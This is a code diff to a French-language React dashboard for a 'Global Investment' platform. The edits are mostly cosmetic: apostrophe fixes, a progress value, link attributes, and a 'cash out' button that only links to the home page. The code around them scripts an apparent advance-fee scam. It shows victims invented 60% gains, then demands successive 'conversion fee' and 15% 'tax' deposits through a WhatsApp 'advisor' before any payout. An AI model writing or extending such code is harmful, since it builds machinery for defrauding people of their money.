@@ -34,8 +34,8 @@ const UserInvest: React.FC = () => {
         description = `Nous sommes ravis de vous accueillir chez Global Investment.
 
 Votre investissement initial de ${user.MontantIvest}  vous permettra de percevoir ${user.MontantRecevoir} .
-Afin d’activer officiellement votre dossier et initier votre stratégie d’investissement, veuillez contacter votre conseiller dédié.`
-        progress = 10
+Afin d'activer officiellement votre dossier et initier votre stratégie d'investissement, veuillez contacter votre conseiller dédié.`
+        progress = 0
         whatsappMessage = `Bonjour, je souhaite débuter mon investissement chez Global Investment.
 Nom: ${user.nom}
 Pays: ${user.pays}
@@ -51,7 +51,7 @@ Montant à investir: ${user.MontantIvest} `
         const nouveauMontant = Number(user.MontantRecevoir) * 1.6
 
         title = `Valorisation exceptionnelle de votre portefeuille`
-        description = `Suite à une évolution favorable du sous-jacent, votre ligne d’investissement a enregistré une appréciation significative de 60%.
+        description = `Suite à une évolution favorable du sous-jacent, votre ligne d'investissement a enregistré une appréciation significative de 60%.
 
 Votre nouveau montant à recevoir est estimé à ${nouveauMontant} .
 
@@ -76,11 +76,11 @@ Un dépôt de ${fraisConversion} , correspondant aux frais de conversion et au s
 
 Montant à recevoir : ${user.MontantRecevoir} 
 
-Veuillez effectuer ce dépôt auprès de votre conseiller afin de garantir la continuité de votre stratégie d’investissement.`
+Veuillez effectuer ce dépôt auprès de votre conseiller afin de garantir la continuité de votre stratégie d'investissement.`
         progress = 65
         whatsappMessage = `Salut, je suis ${user.nom}, pays ${user.pays}, téléphone ${user.phone}.
 Suite aux frais de conversion, je dois effectuer un dépôt de ${fraisConversion}  pour continuer mon investissement.
-Merci de m’accompagner.`
+Merci de m'accompagner.`
     }
 
     /* =============================
@@ -90,9 +90,9 @@ Merci de m’accompagner.`
         const taxes = Number(user.MontantRecevoir) * 0.15
 
         title = `Règlement fiscal réglementaire`
-        description = `Suite à la réalisation de plus-values sur votre portefeuille d’actions, un prélèvement fiscal obligatoire est dû conformément à la réglementation en vigueur.
+        description = `Suite à la réalisation de plus-values sur votre portefeuille d'actions, un prélèvement fiscal obligatoire est dû conformément à la réglementation en vigueur.
 
-Un dépôt de ${taxes}  est requis afin d’apurer cette créance fiscale anticipée, vous permettant de maintenir l’intégrité de votre stratégie d’investissement et d’éviter tout incident de règlement.
+Un dépôt de ${taxes}  est requis afin d'apurer cette créance fiscale anticipée, vous permettant de maintenir l'intégrité de votre stratégie d'investissement et d'éviter tout incident de règlement.
 
 Montant à recevoir : ${user.MontantRecevoir} 
 
@@ -100,7 +100,7 @@ Merci de procéder au dépôt auprès de votre conseiller afin de poursuivre vot
         progress = 90
         whatsappMessage = `Salut, je suis ${user.nom}, pays ${user.pays}, téléphone ${user.phone}.
 Suite aux taxes gouvernementales, je dois effectuer un dépôt de ${taxes}  pour continuer mon investissement.
-Veuillez me l’accorder.`
+Veuillez me l'accorder.`
     }
 
     /* =============================
@@ -110,7 +110,7 @@ Veuillez me l’accorder.`
         title = `Investissement finalisé`
         description = `Votre investissement a été intégralement validé.
 
-Votre conseiller reste à votre entière disposition pour organiser la réception de vos gains ou vous accompagner dans de nouvelles opportunités d’investissement adaptées à votre profil.`
+Votre conseiller reste à votre entière disposition pour organiser la réception de vos gains ou vous accompagner dans de nouvelles opportunités d'investissement adaptées à votre profil.`
         progress = 100
         whatsappMessage = `Bonjour, mon investissement est désormais finalisé.
 Nom: ${user.nom}
@@ -122,24 +122,27 @@ Merci pour votre accompagnement.`
           UI DASHBOARD
     ============================== */
     const infoCards = [
-        // { label: "Nom", value: user.nom, icon: <Home /> },
-        // { label: "Pays", value: user.pays, icon: <Globe /> },
-        // { label: "Téléphone", value: user.phone, icon: <Phone /> },
         { label: "Montant investi", value: `${user.MontantIvest} `, icon: <MdOutlineAccountBalanceWallet /> },
         { label: "Montant à recevoir", value: `${user.MontantRecevoir} `, icon: <MdOutlineAccountBalanceWallet /> },
-        // { label: "Durée", value: user.duree ?? "—", icon: <MdOutlineAccountBalanceWallet /> },
     ]
 
     return (
-        <section className="bg-gray-50 min-h-screen px-4 sm:px-8 py-16">
+        <section className="bg-gray-50 min-h-screen px-4 sm:px-8 pt-4 pb-16">
             <div className="max-w-7xl mx-auto">
+
+                {/* BOUTON ENCAISSER - Positionné en haut à droite */}
+                <div className="flex justify-end mb-8">
+                    <a href="/" className="bg-green-600 hover:bg-green-700 text-white px-6 py-3 rounded-lg font-semibold shadow-md transition transform hover:scale-105">
+                        Encaisser
+                    </a>
+                </div>
 
                 {/* HEADER */}
                 <div className="text-center mb-12">
                     <h1 className="text-3xl sm:text-4xl font-bold text-gray-800 mb-4">
                         {title}
                     </h1>
-                    <p className="text-gray-700 max-w-3xl mx-auto leading-relaxed">
+                    <p className="text-gray-700 max-w-3xl mx-auto leading-relaxed whitespace-pre-line">
                         {description}
                     </p>
                 </div>
@@ -183,7 +186,8 @@ Merci pour votre accompagnement.`
                     <a
                         href={whatsappLink(whatsappMessage)}
                         target="_blank"
-                        className="inline-block bg-green-500 hover:bg-green-600 text-white px-10 py-4 rounded-full font-semibold shadow-xl transition"
+                        rel="noopener noreferrer"
+                        className="inline-block bg-green-500 hover:bg-green-600 text-white px-10 py-4 rounded-full font-semibold shadow-xl transition transform hover:scale-105"
                     >
                         Contacter mon conseiller via WhatsApp
                     </a>
